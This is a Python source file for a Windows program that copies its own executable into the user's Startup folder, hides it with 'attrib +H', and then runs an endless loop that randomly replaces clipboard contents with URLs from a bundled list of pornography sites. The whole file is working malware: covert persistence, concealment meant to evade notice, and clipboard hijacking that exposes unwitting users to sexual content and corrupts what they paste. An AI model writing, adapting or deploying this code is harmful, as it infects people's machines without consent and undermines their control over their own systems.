import pyperclip
import winshell
import random
import time
import sys
import os


# bc schtasks bad and system32 bad!
SECRET_DIR = winshell.startup()
SECRET_DST = os.path.join(SECRET_DIR, os.path.basename(sys.executable))


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, relative_path)


with open(resource_path("porn-sites.list")) as src:
    PORN = src.readlines()


def mess_clipboard(delay=1):
    old_content = None
    while True:
        new_content = pyperclip.paste()
        if new_content and new_content != old_content and random.randrange(3) < 1:
            random_porn = new_content = random.choice(PORN)
            pyperclip.copy(random_porn)
        time.sleep(delay)
        old_content = new_content


def main():
    if getattr(sys, "frozen", False) and sys.executable != SECRET_DIR:
        winshell.copy_file(sys.executable, SECRET_DIR, False, True, False, True)
        os.system(f'attrib +H "{SECRET_DST}"')
    mess_clipboard()


if __name__ == "__main__":
    main()
